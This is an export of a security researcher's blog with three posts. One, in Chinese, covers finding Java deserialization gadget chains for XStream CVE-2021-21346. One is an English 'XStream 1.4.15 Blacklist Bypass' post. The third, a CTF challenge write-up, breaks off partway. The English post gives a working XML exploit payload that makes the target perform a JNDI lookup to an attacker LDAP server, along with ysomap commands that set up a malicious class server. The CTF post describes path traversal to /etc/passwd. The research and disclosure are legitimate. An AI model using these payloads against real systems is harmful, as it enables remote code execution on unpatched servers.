{"pages":[{"title":"","permalink":"http://blog.0kami.cn/404.html","text":"404"},{"title":"About","permalink":"http://blog.0kami.cn/about/index.html","text":"A web ğŸ¶ &amp;&amp; Code reviewer &amp;&amp; Pentesterâ˜ ï¸ opens source tools ysomap:A helpful Java Deserialization exploit framework based on ysoserial MonitorClient: A web server local monitor &amp; webshell scan and kill tool MonitorServer: A web server remote monitor &amp; webshell scan and kill tool"},{"title":"Search","permalink":"http://blog.0kami.cn/search/index.html","text":""}],"posts":[{"title":"å¦‚ä½•é«˜æ•ˆçš„æŒ–æ˜Javaååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Ÿ","permalink":"http://blog.0kami.cn/2021/03/14/java-how-to-find-gadget-chains/","text":"#1 å‰è¨€Javaååºåˆ—åŒ–åˆ©ç”¨é“¾ä¸€ç›´éƒ½æ˜¯å›½å†…å¤–ç ”ç©¶çƒ­ç‚¹ä¹‹ä¸€ï¼Œä½†å½“å‰è‡ªåŠ¨åŒ–æ–¹æ¡ˆgadgetinspectorçš„æ•ˆæœå¹¶ä¸å¥½ã€‚æ‰€ä»¥ç›®å‰å¤šæ•°å¸ˆå‚…ä»ç„¶æ˜¯ä»¥äººå·¥+è‡ªç ”å°å·¥å…·çš„æ–¹å¼è¿›è¡Œåˆ©ç”¨é“¾çš„æŒ–æ˜ã€‚ç›®å‰æˆ‘ä¸ªäººä¹Ÿåœ¨æ‰¾ä¸€ä¸ªåˆé€‚çš„æ–¹æ³•æ¥é«˜æ•ˆæŒ–æ˜åˆ©ç”¨é“¾ï¼Œæœ¬æ–‡å°†ä¸»è¦ä»‹ç»æˆ‘è‡ªå·±çš„ä¸€äº›æŒ–æ˜å¿ƒå¾—ï¼Œè¾…ä»¥XStreamååºåˆ—åŒ–åˆ©ç”¨é“¾CVE-2021-21346ä¸ºä¾‹ã€‚ #1 å‰ç½®çŸ¥è¯†è¿™é‡Œå‰ç½®çŸ¥è¯†ä¸»è¦æœ‰ä¸¤ç±»ï¼šXStreamååºåˆ—åŒ–åˆ©ç”¨é“¾çš„åŸç†å’Œå›¾æ•°æ®åº“æŸ¥è¯¢è¯­æ³• XStreamååºåˆ—åŒ–åˆ©ç”¨é“¾åŸç† è¿™é‡Œå…·ä½“çš„åŸç†å¯ä»¥è§å›é¡¾XStreamååºåˆ—åŒ–æ¼æ´ï¼Œè¿™é‡Œæˆ‘ä»¬åªéœ€çŸ¥é“XStreamåœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å®ƒçš„é™åˆ¶æ˜¯å¾ˆå°‘çš„ï¼ˆä¸ç”¨PureJavaReflectionProviderï¼‰ï¼Œå®ƒç”šè‡³èƒ½è¿˜åŸæ„é€ å¥½çš„Methodå¯¹è±¡ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€è¦æ¸…æ¥šçš„æ˜¯å®ƒçš„è§¦å‘å‡½æ•°sourceæ˜¯ä»€ä¹ˆï¼Œçœ‹æˆ‘ä¸Šé¢é‚£ç¯‡æ–‡ç« èƒ½çŸ¥é“å…±æœ‰hashCodeå‡½æ•°ï¼ˆMapæ–¹å¼ï¼‰ã€compareToå‡½æ•°ï¼ˆTreeSetæ–¹å¼ï¼‰ã€compareå‡½æ•°ï¼ˆPriorityQueueæ–¹å¼ï¼‰ã€‚ å›¾æ•°æ®åº“æŸ¥è¯¢è¯­æ³• è¿™é‡Œç”¨åˆ°äº†æˆ‘å³å°†å¼€æºçš„å·¥å…·tabbyï¼Œè¯¥å·¥å…·å°†jaræ–‡ä»¶è½¬åŒ–ä¸ºä»£ç å±æ€§å›¾ï¼Œç„¶ååç»­æˆ‘ä»¬å¯ä»¥ç”¨neo4jçš„å›¾æ•°æ®åº“æŸ¥è¯¢è¯­æ³•è¿›è¡Œåˆ©ç”¨é“¾çš„æŸ¥æ‰¾ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æœ‰ä¸€å®šçš„å›¾æ•°æ®åº“æŸ¥è¯¢è¯­æ³•çš„åŸºç¡€ #2 åˆ©ç”¨é“¾æŒ–æ˜é¦–å…ˆæœ¬æ¬¡é’ˆå¯¹çš„æ˜¯JDKç›¸å…³Jaræ–‡ä»¶çš„åˆ©ç”¨é“¾æ£€æµ‹åˆ†æï¼Œæ‰€ä»¥å…ˆä½¿ç”¨tabbyç”ŸæˆJDKç›¸å…³çš„ä»£ç å±æ€§å›¾è‡³å›¾æ•°æ®åº“ã€‚æ‰§è¡Œå®Œä»¥ä¸‹ä¸¤å¥å‘½ä»¤ï¼Œå¯ä»¥ç”Ÿæˆä¸€ä¸ª28wæ•°æ®èŠ‚ç‚¹ï¼Œ76wå…³ç³»è¾¹çš„ä»£ç å±æ€§å›¾ï¼š 1234# ç”Ÿæˆå›¾ç¼“å­˜æ–‡ä»¶java -Xmx6g -jar target/tabby-1.0.0-SNAPSHOT.jar --isJDKOnly# å¯¼å…¥Neo4jå›¾æ•°æ®java -Xmx6g -jar target/tabby-1.0.0-SNAPSHOT.jar --isSaveOnly æ¥ä¸‹æ¥ï¼Œæ„é€ å›¾æŸ¥è¯¢è¯­è¨€ï¼Œè¿™é‡Œæä¾›ä¸€ä¸ªæ¨¡ç‰ˆ 1234match (source:Method) // æ·»åŠ whereè¯­å¥é™åˆ¶sourceå‡½æ•°match (sink:Method &#123;IS_SINK:true&#125;) // æ·»åŠ whereè¯­å¥é™åˆ¶sinkå‡½æ•°call apoc.algo.allSimplePaths(m1, source, \"&lt;CALL|ALIAS\", 12) yield path // æŸ¥æ‰¾å…·ä½“è·¯å¾„,12ä»£è¡¨æ·±åº¦ï¼Œå¯ä»¥ä¿®æ”¹return * limit 20 å½“å‰æˆ‘ä»¬å·²ç»ç¡®å®šäº†å½“å‰å¯ä»¥ä½¿ç”¨hashCodeå‡½æ•°ã€compareToå‡½æ•°ã€compareå‡½æ•°ä½œä¸ºsourceå‡½æ•°ï¼Œé‚£ä¹ˆåªè¦å†é™åˆ¶sinkå‡½æ•°å³å¯ï¼Œå¦‚ä¸‹æŸ¥è¯¢è¯­å¥ 1234match (source:Method &#123;NAME:&quot;compare&quot;&#125;)match (sink:Method &#123;IS_SINK:true, NAME:&quot;invoke&quot;&#125;)&lt;-[:CALL]-(m1:Method)call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 20) yield path return * limit 20 æœ¬æ¬¡åˆ©ç”¨é“¾å°†é™åˆ¶å±é™©å‡½æ•°ä¸ºMethod.invokeå‡½æ•°ï¼Œå…·ä½“æŸ¥è¯¢ç»“æœå¦‚ä¸‹å›¾æ‰€ç¤º å¯ä»¥çœ‹åˆ°æœ«ç«¯çš„å±é™©å‡½æ•°è°ƒç”¨ç‚¹ä¸ºsun.swing.SwingLazyValue#createValueï¼Œæ¥çœ‹ä¸€ä¸‹å…·ä½“çš„ä»£ç  123456789101112131415161718192021222324public Object createValue(final UIDefaults table) &#123; try &#123; ReflectUtil.checkPackageAccess(className); Class&lt;?&gt; c = Class.forName(className, true, null); if (methodName != null) &#123; Class[] types = getClassArray(args); Method m = c.getMethod(methodName, types); makeAccessible(m); return m.invoke(c, args); &#125; else &#123; Class[] types = getClassArray(args); Constructor constructor = c.getConstructor(types); makeAccessible(constructor); return constructor.newInstance(args); &#125; &#125; catch (Exception e) &#123; // Ideally we would throw an exception, unfortunately // often times there are errors as an initial look and // feel is loaded before one can be switched. Perhaps a // flag should be added for debugging, so that if true // the exception would be thrown. &#125; return null;&#125; ä»ä»£ç ä¸Šçœ‹ï¼Œè¯¥å‡½æ•°å¯ä»¥è°ƒç”¨ä»»æ„çš„é™æ€å‡½æ•°æˆ–ä»»æ„å¯¹è±¡çš„æ„é€ å‡½æ•°ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å…ˆç¡®å®šå½“å‰è¿™ä¸ªå‡½æ•°æ˜¯å¦æ˜¯å¯ç”¨çš„ï¼Œå³æ‰¾åˆ°åˆé€‚çš„é™æ€å‡½æ•°æˆ–æ„é€ å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šè°ƒç”¨æŸäº›å±é™©å‡½æ•°ä»è€Œè¾¾æˆä»£ç æ‰§è¡Œæˆ–å‘½ä»¤æ‰§è¡Œã€‚è¿™é‡Œä¹ŸåŒæ ·æ„é€ å›¾æŸ¥è¯¢è¯­å¥è¿›è¡Œåˆé€‚å‡½æ•°çš„æŸ¥æ‰¾ï¼Œæš‚æ—¶é™å®šå±é™©å‡½æ•°ä¸ºexecã€lookupã€invokeã€‚ æ‰¾åˆ°äº†ä¸€ä¸ªå¯ä»¥ç”¨çš„å‡½æ•°&lt;javax.naming.InitialContext: java.lang.Object doLookup(java.lang.String)&gt;ï¼Œè¯¥é™æ€å‡½æ•°å¯ä»¥è¿›è¡ŒJNDIæ³¨å…¥æ”»å‡»ã€‚ æ‰€ä»¥åˆ°è¿™é‡Œæˆ‘ä»¬å°±èƒ½ç¡®å®šå½“å‰çš„sun.swing.SwingLazyValue#createValueæ˜¯å¯ä»¥åˆ©ç”¨çš„èŠ‚ç‚¹ã€‚ é‚£ä¹ˆæ ¹æ®å‰ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œæˆ‘ä»¬ç»§ç»­è¿›è¡Œåˆ†æjavax.swing.UIDefaults#getFromHashtableã€‚ 1234567891011121314151617181920private Object getFromHashtable(final Object key) &#123; /* Quickly handle the common case, without grabbing * a lock. */ Object value = super.get(key); // ... /* At this point we know that the value of key was * a LazyValue or an ActiveValue. */ if (value instanceof LazyValue) &#123; try &#123; /* If an exception is thrown we'll just put the LazyValue * back in the table. */ value = ((LazyValue)value).createValue(this); &#125; // ... &#125; javax.swing.UIDefaultsæ˜¯Hashtable&lt;Object,Object&gt;çš„å¦ä¸€ä¸ªå®ç°ï¼Œæ‰€ä»¥è¿™é‡Œsuper.get(key)è·å–åˆ°çš„valueå€¼å¯¹äºæˆ‘ä»¬æ¥è¯´æ˜¯å¯ä»¥ä»»æ„å¡«å……çš„ï¼Œé‚£ä¹ˆæ­¤å¤„å¡«å……å‰é¢çš„sun.swing.SwingLazyValueå¯¹è±¡å³å¯è§¦å‘createValueå‡½æ•°çš„è°ƒç”¨ã€‚ ä»getFromHashtableå‡½æ•°å¼€å§‹ï¼Œè°ƒç”¨å¯¹è±¡çš„æƒ…å†µå¼€å§‹å˜å¤šäº†èµ·æ¥ï¼Œæ­¤æ—¶éœ€è¦å¯¹æ¯ä¸€æ¡è¿›è¡Œåˆ†åˆ«åˆ†æï¼Œä½†å¤šæ•°æƒ…å†µç®€å•çœ‹ä¸€ä¸‹å°±èƒ½ç¡®å®šå½“å‰çš„ä¼ é€’æƒ…å†µæ˜¯å¦å¯å»¶ç»­ã€‚ æ­¤å¤„ï¼Œæˆ‘å°±ç›´æ¥è®²CVE-2021-21346çš„åˆ©ç”¨é“¾ã€‚ javax.swing.UIDefaults#getå‡½æ•° 1234public Object get(Object key) &#123; Object value = getFromHashtable( key ); return (value != null) ? value : getFromResourceBundle(key, null);&#125; getå‡½æ•°å»¶ç»­äº†keyçš„ä¼ é€’ï¼Œç»§ç»­å¾€ä¸Šåˆ†æ javax.swing.MultiUIDefaults#getå‡½æ•° 12345678910111213141516public Object get(Object key)&#123; Object value = super.get(key); if (value != null) &#123; return value; &#125; for (UIDefaults table : tables) &#123; value = (table != null) ? table.get(key) : null; if (value != null) &#123; return value; &#125; &#125; return null;&#125; è¯¥å‡½æ•°æœ‰ä¸¤å¤„åœ°æ–¹è°ƒç”¨äº†javax.swing.UIDefaults#getåˆ†åˆ«æ˜¯ç¬¬3è¡Œã€ç¬¬9è¡Œï¼Œæ‰€ä»¥åœ¨å†™pocçš„æ—¶å€™ï¼Œå¯ä»¥ç›´æ¥æ›¿æ¢ç±»å±æ€§tablesæˆ–hashtableæœ¬èº«çš„valueå€¼ä¹Ÿå¯ä»¥ã€‚ ç»§ç»­å‘ä¸Šï¼Œjavax.swing.MultiUIDefaults#toString 123456789101112131415public synchronized String toString() &#123; StringBuffer buf = new StringBuffer(); buf.append(\"&#123;\"); Enumeration keys = keys(); while (keys.hasMoreElements()) &#123; Object key = keys.nextElement(); buf.append(key + \"=\" + get(key) + \", \"); &#125; int length = buf.length(); if (length &gt; 1) &#123; buf.delete(length-2, length); &#125; buf.append(\"&#125;\"); return buf.toString();&#125; toStringå‡½æ•°éå†äº†å½“å‰hashtableæ‰€å­˜å‚¨çš„å†…å®¹ï¼Œè‡ªç„¶è¿™é‡Œä¹Ÿå°±è°ƒç”¨åˆ°äº†javax.swing.MultiUIDefaults#getå‡½æ•°ï¼ˆç¬¬7è¡Œï¼‰ã€‚ æ‰€ä»¥åˆ°æ­¤ä¸ºæ­¢ï¼Œæˆ‘ä»¬æœ‰ä»toStringå‡½æ•°åˆ°invokeå‡½æ•°çš„è°ƒç”¨é“¾äº†ã€‚ æ¥ä¸‹æ¥å°±æ˜¯æ‰¾åˆ°è§¦å‘å‡½æ•°åˆ°toStringå‡½æ•°çš„è°ƒç”¨é“¾äº†ï¼Œè¿™é‡Œä¸ºäº†æŸ¥è¯¢ç»“æœæ›´ä¸ºæ¸…æ™°ï¼Œæˆ‘ä»¬åªæŸ¥è¯¢ä»è§¦å‘å‡½æ•°åˆ°toStringå‡½æ•°çš„åˆ©ç”¨é“¾æƒ…å†µã€‚ 1234match (source:Method) where source.NAME in [&quot;compareTo&quot;]match (sink:Method &#123;NAME:&quot;toString&quot;&#125;)&lt;-[r:CALL]-(m1:Method) where r.REAL_CALL_TYPE in [&quot;java.lang.Object&quot;]call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 6) yield path return * limit 20 è¿™é‡Œæ¯”è¾ƒéš¾å—çš„æ˜¯ä¸‰ä¸ªè§¦å‘å‡½æ•°å’ŒtoStringå‡½æ•°éƒ½æ˜¯æœ‰å¤§é‡å®ç°çš„å‡½æ•°ï¼Œæ‰€ä»¥å¦‚æœè¦æ‰¾åˆ°ä¸€æ¡å¯ç”¨çš„å¾—çœ‹ä¸å°‘æ—¶é—´ã€‚ä¸‹å›¾ç®€å•å¤„ç†äº†ä¸€ä¸‹ï¼ˆå›¾ä¸­ç”»çš„ç®­å¤´åªæ˜¯ä¸€ç§å¯èƒ½æ€§ï¼‰ æ­¤å¤„æˆ‘ä»¬ä»compareToå¼€å§‹è®²ï¼Œjavax.naming.ldap.Rdn$RdnEntry#compareTo 1234567891011public int compareTo(RdnEntry that) &#123; int diff = type.compareToIgnoreCase(that.type); if (diff != 0) &#123; return diff; &#125; if (value.equals(that.value)) &#123; // try shortcut return 0; &#125; return getValueComparable().compareTo( that.getValueComparable());&#125; è¿™é‡Œçš„ç±»å±æ€§valueå‘èµ·äº†equalså‡½æ•°ï¼Œå¾€ä¸‹çœ‹com.sun.org.apache.xpath.internal.objects.XString#equals 12345678910111213141516public boolean equals(Object obj2) &#123; if (null == obj2) return false; // In order to handle the 'all' semantics of // nodeset comparisons, we always call the // nodeset function. else if (obj2 instanceof XNodeSet) return obj2.equals(this); else if(obj2 instanceof XNumber) return obj2.equals(this); else return str().equals(obj2.toString()); &#125; è¿™é‡Œç›´æ¥è°ƒç”¨äº†obj2çš„toStringå‡½æ•°ï¼Œæ‰€ä»¥è¿ä¸Šå‰é¢çš„åˆ©ç”¨é“¾å®Œæ•´çš„åˆ©ç”¨é“¾å°±å‡ºæ¥äº† 12345678javax.naming.ldap.Rdn$RdnEntry.compareTo com.sun.org.apache.xpath.internal.objects.XString.equal javax.swing.MultiUIDefaults.toString UIDefaults.get UIDefaults.getFromHashTable UIDefaults$LazyValue.createValue SwingLazyValue.createValue javax.naming.InitialContext.doLookup() è‡³æ­¤ï¼ŒCVE-2021-21346å°±æŒ–å‡ºæ¥äº†ï¼Œç›¸å¯¹äºäººå·¥æŒ–ï¼Œå½“å‰çš„æ–¹æ³•å¤§å¹…åº¦å‡å°‘äº†åˆ©ç”¨é“¾çš„å¯èƒ½æ€§ç§ç±»ï¼ŒåŒæ ·ï¼Œå¦ä¸€æ¡CVE-2021-21351ä¹Ÿæ˜¯åŒæ ·çš„æ–¹æ³•å¯ä»¥å‘ç°ï¼Œä»¥åæœ‰ç©ºå†è¡¥å……äº›å…¶ä»–çš„æ¡ˆä¾‹:) #3 åˆ©ç”¨é“¾æ„é€ å½“å‰è¿™æ¡åˆ©ç”¨é“¾çš„æ„é€ ç›¸å¯¹æ¥è¯´æ¯”è¾ƒç®€å•ï¼Œåªéœ€è¦æ„é€ å¥½MultiUIDefaultså³å¯ï¼Œä¸‹é¢ä¸ºéƒ¨åˆ†æ„é€ ä»£ç ï¼Œè¯¦ç»†è§LazyValue 1234567891011121314UIDefaults uiDefaults = new UIDefaults();Object multiUIDefaults = ReflectionHelper.newInstance(\"javax.swing.MultiUIDefaults\", new Object[]&#123;new UIDefaults[]&#123;uiDefaults&#125;&#125;);uiDefaults.put(\"lazyValue\", obj);Object rdnEntry1 = ReflectionHelper.newInstance(\"javax.naming.ldap.Rdn$RdnEntry\", null);ReflectionHelper.setFieldValue(rdnEntry1, \"type\", \"ysomap\");ReflectionHelper.setFieldValue(rdnEntry1, \"value\", new XString(\"test\"));Object rdnEntry2 = ReflectionHelper.newInstance(\"javax.naming.ldap.Rdn$RdnEntry\", null);ReflectionHelper.setFieldValue(rdnEntry2, \"type\", \"ysomap\");ReflectionHelper.setFieldValue(rdnEntry2, \"value\", multiUIDefaults);return PayloadHelper.makeTreeSet(rdnEntry2, rdnEntry1); #4 æ€»ç»“13å·çš„æ—¶å€™XStreamå‘å¸ƒäº†1.4.16ï¼Œå…±ä¿®å¤äº†11ä¸ªCVEï¼Œå…¶ä¸­è¿˜æ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯threedr3amçš„classloaderçš„åˆ©ç”¨æ–¹å¼ï¼Œä»¥åŠé’Ÿæ½¦è´µå¸ˆå‚…çš„CVE-2021-21345ï¼ˆè¿™æ¡åˆ©ç”¨é“¾å¾ˆé•¿ï¼Œæˆ‘å½“å‰åªç”¨tabbyåšäº†12ä¸ªèŠ‚ç‚¹çš„æŸ¥æ‰¾ï¼Œè¿™æ¡é“¾å¤§æ¦‚æœ‰20ä¸ªèŠ‚ç‚¹ï¼Œå—¯ï¼Œå¾ˆé•¿ï¼‰ã€‚ç›¸ä¿¡è¿™æ³¢å®Œäº†ä¹‹åï¼Œä¼°è®¡è¿˜èƒ½æ‰¾åˆ°ä¸€äº›æ¼ç½‘ä¹‹é±¼XD"},{"title":"XStream 1.4.15 Blacklist Bypass","permalink":"http://blog.0kami.cn/2021/01/03/java-xstream-blacklist-bypass/","text":"#1 Gadget OverviewRecently, I found a new deserialzation gadget which can bypass the latest version of XStream. This gadget use the JDK to construct the gadget chain. I had tested the gadget chain to RCE (remote code execute) with the version of JDK8 (8u162). I think other version of JDK also could trigger this vulnerablity to the RCE. Letâ€™s look at this gadget, and the detail is in part #3. 123456789TreeSet.putAlljavax.naming.ldap.Rdn$RdnEntry.compareTo com.sun.org.apache.xpath.internal.objects.XString.equal javax.swing.MultiUIDefaults.toString UIDefaults.get UIDefaults.getFromHashTable UIDefaults$LazyValue.createValue SwingLazyValue.createValue javax.naming.InitialContext.doLookup() #2 Poc1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;sorted-set&gt; &lt;javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;type&gt;ysomap&lt;/type&gt; &lt;value class=\"javax.swing.MultiUIDefaults\" serialization=\"custom\"&gt; &lt;unserializable-parents/&gt; &lt;hashtable&gt; &lt;default&gt; &lt;loadFactor&gt;0.75&lt;/loadFactor&gt; &lt;threshold&gt;525&lt;/threshold&gt; &lt;/default&gt; &lt;int&gt;700&lt;/int&gt; &lt;int&gt;0&lt;/int&gt; &lt;/hashtable&gt; &lt;javax.swing.UIDefaults&gt; &lt;default&gt; &lt;defaultLocale&gt;zh_CN&lt;/defaultLocale&gt; &lt;resourceCache/&gt; &lt;/default&gt; &lt;/javax.swing.UIDefaults&gt; &lt;javax.swing.MultiUIDefaults&gt; &lt;default&gt; &lt;tables&gt; &lt;javax.swing.UIDefaults serialization=\"custom\"&gt; &lt;unserializable-parents/&gt; &lt;hashtable&gt; &lt;default&gt; &lt;loadFactor&gt;0.75&lt;/loadFactor&gt; &lt;threshold&gt;525&lt;/threshold&gt; &lt;/default&gt; &lt;int&gt;700&lt;/int&gt; &lt;int&gt;1&lt;/int&gt; &lt;string&gt;lazyValue&lt;/string&gt; &lt;sun.swing.SwingLazyValue&gt; &lt;className&gt;javax.naming.InitialContext&lt;/className&gt; &lt;methodName&gt;doLookup&lt;/methodName&gt; &lt;args&gt; &lt;string&gt;ldap://localhost:1099/EvilObj&lt;/string&gt; &lt;/args&gt; &lt;/sun.swing.SwingLazyValue&gt; &lt;/hashtable&gt; &lt;javax.swing.UIDefaults&gt; &lt;default&gt; &lt;defaultLocale reference=\"../../../../../../../javax.swing.UIDefaults/default/defaultLocale\"/&gt; &lt;resourceCache/&gt; &lt;/default&gt; &lt;/javax.swing.UIDefaults&gt; &lt;/javax.swing.UIDefaults&gt; &lt;/tables&gt; &lt;/default&gt; &lt;/javax.swing.MultiUIDefaults&gt; &lt;/value&gt; &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;type&gt;ysomap&lt;/type&gt; &lt;value class=\"com.sun.org.apache.xpath.internal.objects.XString\"&gt; &lt;m__obj class=\"string\"&gt;test&lt;/m__obj&gt; &lt;/value&gt; &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;&lt;/sorted-set&gt; when you try to reproduce this vulnerablity, you should change the line 37â€™s content. For example, changing the ldap://localhost:1099/EvilObj to ldap://your-evil-ldap-server:port/Namespace #3 AnalysisFirst of all, XStream can deserialize a tag with &lt;sorted-set&gt; using the TreeSet/TreeMapConverter. And the recover process will call some objectâ€™s compareTo function and not in the default blacklist. So I try to find a Object with compareTo function. Using javax.naming.ldap.Rdn$RdnEntry.compareTo() 1234567891011public int compareTo(RdnEntry that) &#123; int diff = type.compareToIgnoreCase(that.type); if (diff != 0) &#123; return diff; &#125; if (value.equals(that.value)) &#123; // try shortcut return 0; &#125; return getValueComparable().compareTo( that.getValueComparable());&#125; The field value is a Object type, so we can use any type of class to transfer the chain. Using com.sun.org.apache.xpath.internal.objects.XString.equal() 12345678910111213141516public boolean equals(Object obj2)&#123; if (null == obj2) return false; // In order to handle the 'all' semantics of // nodeset comparisons, we always call the // nodeset function. else if (obj2 instanceof XNodeSet) return obj2.equals(this); else if(obj2 instanceof XNumber) return obj2.equals(this); else return str().equals(obj2.toString());&#125; The line 15 call the obj2.toString function, and not check the obj2â€˜s type. So we can find a anytype class with toString function. Using javax.swing.MultiUIDefaults.toString() 123456789101112131415public synchronized String toString() &#123; StringBuffer buf = new StringBuffer(); buf.append(\"&#123;\"); Enumeration keys = keys(); while (keys.hasMoreElements()) &#123; Object key = keys.nextElement(); buf.append(key + \"=\" + get(key) + \", \"); &#125; int length = buf.length(); if (length &gt; 1) &#123; buf.delete(length-2, length); &#125; buf.append(\"&#125;\"); return buf.toString();&#125; The line 7 trigger the get function. 123456789101112131415public Object get(Object key)&#123; Object value = super.get(key); if (value != null) &#123; return value; &#125; for (UIDefaults table : tables) &#123; value = (table != null) ? table.get(key) : null; if (value != null) &#123; return value; &#125; &#125; return null;&#125; And on getfunction, the line 9 call the javax.swing.UIDefaults.get() 1234public Object get(Object key) &#123; Object value = getFromHashtable( key ); return (value != null) ? value : getFromResourceBundle(key, null);&#125; Next, the line 2 trigger the getFromHashtable function. 12345678910111213private Object getFromHashtable(final Object key) &#123; // ... synchronized(this) &#123; value = super.get(key); // ... if (value instanceof LazyValue) &#123; try &#123; /* If an exception is thrown we'll just put the LazyValue * back in the table. */ value = ((LazyValue)value).createValue(this); &#125; When value is LazyValue type, trigger the javax.swing.UIDefaults$LazyValue.createValue(). Next, I found a implementation of LazyValue which can call any static method using reflection. Using sun.swing.SwingLazyValue.createValue() 123456789101112131415161718192021222324public Object createValue(final UIDefaults table) &#123; try &#123; ReflectUtil.checkPackageAccess(className); Class&lt;?&gt; c = Class.forName(className, true, null); if (methodName != null) &#123; Class[] types = getClassArray(args); Method m = c.getMethod(methodName, types); makeAccessible(m); return m.invoke(c, args); &#125; else &#123; Class[] types = getClassArray(args); Constructor constructor = c.getConstructor(types); makeAccessible(constructor); return constructor.newInstance(args); &#125; &#125; catch (Exception e) &#123; // Ideally we would throw an exception, unfortunately // often times there are errors as an initial look and // feel is loaded before one can be switched. Perhaps a // flag should be added for debugging, so that if true // the exception would be thrown. &#125; return null;&#125; The line 4 to 9 will call a classâ€™s static method, so we should find a static method which can do something evil. I found the javax.naming.InitialContext.doLookup() method is a good choice. 1234public static &lt;T&gt; T doLookup(String name) throws NamingException &#123; return (T) (new InitialContext()).lookup(name);&#125; This method could launch a JNDI connection. So we can set up a evil LDAP/RMI server to execute arbitrary code we wanted. For example, using my tool ysomap to set up a LDAP server and evil http server 12345678910111213141516// set up a evil http serveruse exploit SimpleHTTPServeruse payload EvilFileWrapperuse bullet ClassWithEvilConstructorset lport 8088set path /EvilObj.classset classname EvilObjset body &quot;open -a Calculator&quot;set type classrun// set up a evil LDAP serveruse exploit LDAPRefListenerset lport 1099set codebase http://localhost:8088/set objectName EvilObjrun Then, try to deserialze the payload, you will get a calculator XD"},{"title":"xnuca2020 easyjavaè®¾è®¡æ€è·¯","permalink":"http://blog.0kami.cn/2020/11/02/ctf-xnuca-2020-easyjava/","text":"0x00 å‰è¨€easyjavaçš„è®¾è®¡æ€è·¯ä¸»è¦æ¥æºäºç°å®ç¯å¢ƒä¸­é‡åˆ°çš„ä¸€äº›é—®é¢˜ï¼Œä»¥åŠæœ€è¿‘åˆšå‡ºçš„mybatisäºŒçº§ç¼“å­˜ååºåˆ—åŒ–çš„å®‰å…¨é—®é¢˜çš„ä¸€ç§è®¾æƒ³ã€‚é¢˜ç›®çš„è®¾è®¡ç›®çš„ä¸»è¦è€ƒå¯Ÿé€‰æ‰‹å¯¹äºå®æ“æ€§çš„æ¼æ´çš„åˆ©ç”¨ä»¥åŠæºç å®¡è®¡èƒ½åŠ›ã€‚ å…·ä½“çš„è€ƒç‚¹å¦‚ä¸‹ï¼š ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œ/proc/self/fdçš„åˆ©ç”¨ mybatisç¼“å­˜ååºåˆ—åŒ–æ¼æ´ï¼ŒCVE-2020-26945 xstreamååºåˆ—åŒ–åˆ©ç”¨ï¼Œç®€å•æ­£åˆ™wafç»•è¿‡ï¼Œç±»æ¯”fastjson unicodeç¼–ç ç»•è¿‡ é«˜ç‰ˆæœ¬javaç‰ˆæœ¬ä¸‹çš„jndiåˆ©ç”¨ 0x01 é¢„æœŸé¢˜è§£é¢˜ç›®æœ¬èº«è®¾è®¡çš„åŠŸèƒ½ç‚¹æ¯”è¾ƒå°‘ï¼Œä¸»è¦æ˜¯jpgå›¾ç‰‡ç­¾åï¼Œä¸‹è½½å’ŒéªŒç­¾åŠŸèƒ½ #1 æºç è·å–è¿™é‡Œé¦–å…ˆå…³æ³¨ä¸‹è½½çš„æ¥å£ åœ¨è¿”å›åŒ…é‡Œå­˜åœ¨Checkå­—æ®µï¼Œäºgetè¯·æ±‚ä¸­çš„signå­—æ®µæ˜¯ä¸€æ ·çš„å†…å®¹ï¼Œå°è¯•ä¿®æ”¹filenameä¸º../../../../../../etc/passwd checkå­—æ®µè¿”å›äº†ä¸ä¸€æ ·çš„å†…å®¹ï¼Œè¿™é‡Œåˆ¤æ–­å¯èƒ½signå€¼ç”¨äºæ ¡éªŒï¼Œé€šè¿‡æ‰è¿”å›ç»“æœï¼Œé‚£ä¹ˆä¿®æ”¹signå­—æ®µï¼Œå³å¯è·å–åˆ°å½“å‰è¯·æ±‚çš„å†…å®¹ã€‚æ¥ä¸‹æ¥ï¼Œç”±äºæ˜¯linuxç³»ç»Ÿï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æš´åŠ›fdå€¼æ¥è·å–åˆ°å½“å‰è¿è¡Œçš„jaråŒ…å†…å®¹ï¼Œå¦‚/proc/self/fd/4æ¥è·å–jaråŒ… #2 mybatis SQLæ³¨å…¥æ‹¿åˆ°jaråç¼–è¯‘åå…ˆçœ‹pomï¼Œå…¶ä¸­æ¯”è¾ƒå®¹æ˜“å…³æ³¨çš„ä¸»è¦æ˜¯ä¸¤ä¸ªjaråŒ…ï¼Œä¸€ä¸ªæ˜¯mybatisçš„springbootåŒ…ï¼Œå¦ä¸€ä¸ªæ˜¯xstreamçš„åŒ… å¦‚æœå…³æ³¨cveåŠ¨æ€çš„è¯ï¼Œå¯ä»¥çŸ¥é“æœ€è¿‘åˆšå‡ºçš„æ¼æ´CVE-2020-26945ï¼Œè™½ç„¶mybatisçš„ç‰ˆæœ¬å·²ç»è¿›è¡Œäº†å‡çº§ï¼Œä½†springçš„mybatisåŒ…ä¸­çš„mybatisä¾èµ–å¹¶æ²¡æœ‰å‡çº§ï¼Œä»ç„¶æ˜¯3.5.5ç‰ˆæœ¬ï¼Œå†ç¡®å®šä¸€ä¸‹ï¼Œæ˜¯å¦å¯ç”¨äº†cache ä»mapperå¯¹åº”çš„xmlé…ç½®é‡Œå¯ä»¥çœ‹åˆ°å¼€å¯äº†cacheé…ç½®ï¼Œå¹¶ä¸”findByHashAndSecretæ¥å£å­˜åœ¨æ³¨å…¥ã€‚ 